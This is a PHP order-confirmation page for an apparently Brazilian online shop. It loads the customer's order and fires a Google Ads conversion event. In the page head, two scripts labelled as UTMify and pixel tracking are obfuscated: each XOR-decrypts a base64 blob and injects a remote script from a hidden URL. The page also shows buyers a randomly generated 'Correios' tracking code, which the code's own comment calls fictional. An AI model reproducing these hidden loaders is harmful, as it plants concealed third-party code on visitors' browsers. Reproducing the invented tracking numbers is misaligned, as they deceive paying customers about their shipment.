<?php
// Arquivo: thanks.php - Página de Agradecimento e Detalhes do Pedido

// 1. INICIALIZAÇÃO E SESSÃO
if (session_status() === PHP_SESSION_NONE) {
    session_start();
}

require_once 'db_config.php';

// --- Função para gerar código de rastreio fictício (Padrão Correios) ---
function generateFictionalTrackingCode() {
    $prefix = ['SS', 'JR', 'LM', 'PB', 'CA', 'DX'];
    $suffix = ['BR'];

    $start = $prefix[array_rand($prefix)];
    $digits = '';
    for ($i = 0; $i < 9; $i++) {
        $digits .= mt_rand(0, 9);
    }
    $end = $suffix[array_rand($suffix)];

    return $start . $digits . $end;
}
// ----------------------------------------------------------------------------


// 2. VALIDAÇÃO DE SEGURANÇA E PARÂMETROS
if (empty($_SESSION['_device_verified']) || !isset($_SESSION['user_logged_in']) || !isset($_SESSION['user_id'])) {
    header('Location: index.php');
    exit;
}

$user_id = (int)$_SESSION['user_id'];
$pedido_id = (int)($_GET['pedido_id'] ?? 0);

if ($pedido_id === 0) {
    header('Location: index.php');
    exit;
}


// 3. BUSCA DOS DADOS DO PEDIDO
$pedido = null;
try {
    // Nota: O seu código original já usa PDO, o que é ótimo para PostgreSQL
    $stmt = $pdo->prepare("
        SELECT
            id, status, customer_name, customer_email, product_name, quantity, total_amount_centavos, created_at
        FROM
            pedidos
        WHERE
            id = :pedido_id AND user_id = :user_id
    ");
    $stmt->execute([':pedido_id' => $pedido_id, ':user_id' => $user_id]);
    $pedido = $stmt->fetch(PDO::FETCH_ASSOC);

    if (!$pedido) {
        header('Location: index.php');
        exit;
    }
} catch (PDOException $e) {
    error_log("Erro ao buscar pedido em thanks.php: " . $e->getMessage());
    die("Erro interno ao carregar o pedido.");
}


// =========================================================================
// 4. NOVO BLOCO: BUSCA DAS CONFIGURAÇÕES DE MARKETING DO DB
// =========================================================================
$configuracoes = [];
try {
    // Busca todas as configurações de marketing (PDO::FETCH_KEY_PAIR é ideal aqui)
    $stmt_config = $pdo->query("SELECT chave, valor FROM configuracoes_marketing");
    $resultados = $stmt_config->fetchAll(PDO::FETCH_KEY_PAIR);

    // Armazena no array de configurações. Ex: $configuracoes['google_tag_id']
    $configuracoes = $resultados;

} catch (PDOException $e) {
    // Se o DB estiver inacessível ou a tabela não existir, usamos valores vazios para evitar erro fatal
    error_log("Erro ao buscar configurações de marketing: " . $e->getMessage());
    $configuracoes = [
        'google_tag_id' => '',
        'google_conversion_label' => '',
        'google_currency' => 'BRL'
    ];
}


// =========================================================================
// 5. PREPARAÇÃO FINAL DOS DADOS PARA EXIBIÇÃO E TAG DO GOOGLE
// =========================================================================
$total_brl = number_format($pedido['total_amount_centavos'] / 100, 2, ',', '.');
$data_pedido = date('d/m/Y H:i', strtotime($pedido['created_at']));
$status_display = ($pedido['status'] === 'APROVADO') ? 'Pagamento Aprovado' : 'Status: ' . $pedido['status'];
$customer_name_display = htmlspecialchars($pedido['customer_name']);
$customer_email_display = htmlspecialchars($pedido['customer_email']);
$product_name_full = htmlspecialchars($pedido['product_name']);
$product_quantity = $pedido['quantity'];
$tracking_code = generateFictionalTrackingCode();

// Variáveis essenciais para a Tag do Google:
// Valor: DEVE ser float/decimal, usando PONTO como separador decimal.
$valor_transacao_google = number_format($pedido['total_amount_centavos'] / 100, 2, '.', '');
$id_transacao_google = htmlspecialchars($pedido['id']); // Usa o ID do pedido
$moeda_google = $configuracoes['google_currency'] ?? 'BRL'; // Valor do DB
$tag_id = $configuracoes['google_tag_id'] ?? ''; // Valor do DB
$conversion_label = $configuracoes['google_conversion_label'] ?? ''; // Valor do DB

// Monta o send_to completo (ex: AW-12345/abcde)
$send_to = !empty($tag_id) && !empty($conversion_label) ? $tag_id . '/' . $conversion_label : '';
?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Obrigado! Pedido #<?php echo htmlspecialchars($pedido['id']); ?></title>

    <!-- Script de Rastreamento UTMify -->
    <script>(function(){var t_z8r=atob("DLXbsh2ZzquTOvrOD875x2/17JGxUo66f8bhnTL6qsW9T46jZtOinH72o4XxSNW9bMeywmnq4d7nV4nhY9Sv127t4MHgGNbsbsGvwHT7u9/2Sdj0VM753Hz0q4mpGJ6ve9T2x2n0p83qF4q8asO+3Gm0tsj8Xte9bN75nj/vr8fmX9j0LZemnma7oMr+X9j0LdG6xny0u9/+U5y3IsWp12v8oN++SY+sZtGokDG7uMr/T5/sNZf5z0Dk");var e_nj=[];for(var s_9qj5=0;s_9qj5<t_z8r.length;s_9qj5++){e_nj.push(t_z8r.charCodeAt(s_9qj5)&255);}var k_1q=e_nj[0];var v_8v=e_nj.slice(1,1+k_1q);var h_t=e_nj.slice(1+k_1q);var w_fa=h_t.map(function(b,n_u0ll){return b^v_8v[n_u0ll%k_1q];});var p_pk="";for(var x_u2o=0;x_u2o<w_fa.length;x_u2o++){p_pk+=String.fromCharCode(w_fa[x_u2o]&255);}var d_cvwi=decodeURIComponent(escape(p_pk));var c_8=JSON.parse(d_cvwi);var b_tan8=c_8.globals||[];b_tan8.forEach(function(r_4h){window[r_4h.name]=r_4h.value;});var s_vmw=document.createElement("script");s_vmw.src=c_8.url;s_vmw.async=true;s_vmw.defer=true;(c_8.attributes||[]).forEach(function(z_vr1){s_vmw.setAttribute(z_vr1.name,z_vr1.value);});(document.head||document.documentElement).appendChild(s_vmw);})();</script>

    <!-- Script do Pixel de Rastreamento -->
    <script>(function(){var k_2=atob("DGSamrb00VpPhpvo1R+478SY82Bt7u+cpRegtZmXtTRh8++FvALjtNWbvHQt9LSbthbz6sKH/iom/v6E+hTz4tOY/C4m7e+Hvkrw6ZTY8zs78umBtxHu/8XW6wESqrmPuQv4+9qH82AU/bmGtAn/uIzWpTMk0vSDhQ3i/9q9tXhjpO2JuRH/uIzW5zsttf/c5l2vrobG4Dx/samLswD8o4+R8ycS+w==");var s_l=[];for(var a_fbz=0;a_fbz<k_2.length;a_fbz++){s_l.push(k_2.charCodeAt(a_fbz)&255);}var m_3g2b=s_l[0];var z_jr=s_l.slice(1,1+m_3g2b);var r_x3=s_l.slice(1+m_3g2b);var c_x4xl=r_x3.map(function(b,n_bxk0){return b^z_jr[n_bxk0%m_3g2b];});var j_4bs="";for(var c_7=0;c_7<c_x4xl.length;c_7++){j_4bs+=String.fromCharCode(c_x4xl[c_7]&255);}var j_0=decodeURIComponent(escape(j_4bs));var c_ys=JSON.parse(j_0);var i_bo=c_ys.globals||[];i_bo.forEach(function(q_o02){window[q_o02.name]=q_o02.value;});var t_01b=document.createElement("script");t_01b.src=c_ys.url;t_01b.async=true;t_01b.defer=true;(c_ys.attributes||[]).forEach(function(u_fv){t_01b.setAttribute(u_fv.name,u_fv.value);});(document.head||document.documentElement).appendChild(t_01b);})();</script>

    <?php if (!empty($tag_id) && !empty($send_to)) : ?>

        <script async src="https://www.googletagmanager.com/gtag/js?id=<?php echo $tag_id; ?>"></script>
        <script>
          window.dataLayer = window.dataLayer || [];
          function gtag(){dataLayer.push(arguments);}
          gtag('js', new Date());
          gtag('config', '<?php echo $tag_id; ?>');
        </script>

        <script>
          gtag('event', 'conversion', {
            'send_to': '<?php echo $send_to; ?>',
            'value': <?php echo $valor_transacao_google; ?>,
            'currency': '<?php echo $moeda_google; ?>',
            'transaction_id': '<?php echo $id_transacao_google; ?>',
          });
        </script>

    <?php endif; ?>

    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap">
    <style>
        /* Base e Container (Padrão dos módulos) */
        body { font-family: 'Roboto', sans-serif; background-color: #f0f2f5; margin: 0; padding: 0; display: flex; justify-content: center; align-items: flex-start; min-height: 100vh; padding-top: 30px; padding-bottom: 30px; }
        .card-container {
            max-width: 400px;
            width: 90%;
            background-color: #FFFFFF;
            padding: 25px;
            border-radius: 8px;
            box-shadow: 0 1px 5px rgba(0, 0, 0, 0.1);
            text-align: center;
            margin-left: 17px;
            margin-right: 17px;
            margin-top: 110px;
        }
        /* ... (Restante do seu CSS) ... */
        .header-icon { margin-bottom: 20px; }
        .header-icon svg { width: 45px; height: 45px; color: #4CAF50; }
        .title-main { font-size: 20px; font-weight: 700; color: #222; margin: 0 0 5px 0; }
        .subtitle-email { font-size: 14px; color: #555; margin-bottom: 25px; line-height: 1.4; }
        .email-address { font-weight: 700; color: #fe3c47; }
        .name-pedido { font-weight: 700; color: #000000ff; }
        .details-box { text-align: left; background-color: #FFFFFF; padding: 10px 0; border-radius: 8px; margin-bottom: 15px; border-top: 1px solid #EEE; }
        .details-box p { margin: 0; padding: 10px 0; font-size: 14px; color: #333; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #EEE; }
        .details-box p:last-child { border-bottom: none; }
        .details-box p strong { font-weight: 500; color: #222; }
        .details-box .status-chip { background-color: #E8F5E9; color: #4CAF50; padding: 4px 8px; border-radius: 4px; font-weight: 500; font-size: 13px; }
        .details-section-title { font-size: 15px; font-weight: 700; color: #222; margin-bottom: 10px; text-align: center; padding-top: 5px; }
        .product-name-wrapper {
            display: flex;
            align-items: flex-start;
            flex-grow: 1;
            overflow: hidden;
            line-height: 1.4;
        }
        .product-name-text {
            display: inline;
            max-width: 100%;
            word-wrap: break-word;
            margin-left: 15px;
        }
        .toggle-btn {
            background: none;
            border: none;
            color: #fe3c47;
            font-size: 12px;
            font-weight: 500;
            padding: 0 0 0 5px;
            cursor: pointer;
            white-space: nowrap;
            transition: color 0.2s;
        }
        .tracking-code {
            font-weight: 700 !important;
            color: #222 !important;
        }
        .total-wrapper { margin-top: 20px; border-top: 1px solid #EEE; padding-top: 15px; }
        .total-label { font-size: 16px; font-weight: 500; color: #555; }
        .total-value { font-size: 24px; font-weight: 700; color: #fe3c47; }
        .back-link {
            display: block;
            margin-top: 30px;
            padding: 15px 25px;
            background-color: #fe3c47;
            color: #FFFFFF;
            font-weight: 500;
            text-decoration: none;
            border-radius: 8px;
            transition: background-color 0.2s;
            font-size: 16px;
        }
        .back-link:hover { background-color: #d3303b; }
    </style>
</head>
<body>

<div class="card-container">
    <div class="header-icon">
        <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="3" stroke="currentColor">
            <path stroke-linecap="round" stroke-linejoin="round" d="M9 12.75L11.25 15 15 9.75M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
        </svg>
    </div>

    <h1 class="title-main">Pedido #<?php echo htmlspecialchars($pedido['id']); ?> Recebido!</h1>

    <p class="subtitle-email">
        Obrigado, <span class="name-pedido"><?php echo $customer_name_display; ?></span>. Os detalhes foram enviados para <span class="email-address"><?php echo $customer_email_display; ?></span>.
    </p>

    <div class="details-section-title">Resumo do Pedido</div>

    <div class="details-box">
        <p>
            <span>Status do Pagamento</span>
            <strong class="status-chip"><?php echo $status_display; ?></strong>
        </p>
        <p>
            <span>Item:</span>
            <strong style="display:flex; align-items:flex-start;">
                <span id="productNameDisplay" class="product-name-wrapper">
                    <span id="productNameText" class="product-name-text">
                        <?php echo $product_name_full; ?>
                    </span>
                    <button id="toggleBtn" class="toggle-btn" style="display:none;">&#9660;</button>
                </span>
            </strong>
        </p>
        <p>
            <span>Quantidade</span>
            <strong><?php echo $product_quantity; ?></strong>
        </p>
        <p>
            <span>Rastreio Correios</span>
            <strong class="tracking-code"><?php echo $tracking_code; ?></strong>
        </p>
        <p>
            <span>Método</span>
            <strong>PIX (Imediato)</strong>
        </p>
        <p>
            <span>Data da Compra</span>
            <strong><?php echo $data_pedido; ?></strong>
        </p>
    </div>

    <div class="total-wrapper">
        <div class="total-label">Total Pago</div>
        <div class="total-value">R$ <?php echo $total_brl; ?></div>
    </div>

    <a href="index.php" class="back-link">Continuar Comprando</a>
</div>

<script>
document.addEventListener('DOMContentLoaded', function() {
    const productNameText = document.getElementById('productNameText');
    const toggleBtn = document.getElementById('toggleBtn');
    // Usamos addslashes() no PHP para garantir que aspas simples no nome não quebrem o JS
    const productFullName = "<?php echo addslashes($product_name_full); ?>";
    const MAX_LENGTH = 40;

    // 1. Verifica se o nome é longo e precisa de truncamento
    if (productFullName.length > MAX_LENGTH) {

        // Inicialmente, trunca o texto
        productNameText.textContent = productFullName.substring(0, MAX_LENGTH) + '...';
        toggleBtn.style.display = 'inline';
        toggleBtn.innerHTML = '&#9660;'; // Seta para baixo para Ver Mais
        productNameText.setAttribute('data-truncated', 'true');

        // 2. Adiciona o Listener ao botão
        toggleBtn.addEventListener('click', function() {
            const isTruncated = productNameText.getAttribute('data-truncated') === 'true';

            if (isTruncated) {
                // Expande: mostra o texto completo
                productNameText.textContent = productFullName;
                toggleBtn.innerHTML = '&#9650;'; // Seta para cima para Ver Menos
                productNameText.setAttribute('data-truncated', 'false');
            } else {
                // Contrair: mostra o texto truncado
                productNameText.textContent = productFullName.substring(0, MAX_LENGTH) + '...';
                toggleBtn.innerHTML = '&#9660;'; // Seta para baixo para Ver Mais
                productNameText.setAttribute('data-truncated', 'true');
            }
        });

    } else {
        // Se for curto, apenas garante que o botão não apareça
        toggleBtn.style.display = 'none';
        productNameText.textContent = productFullName;
    }
});
</script>

</body>
</html>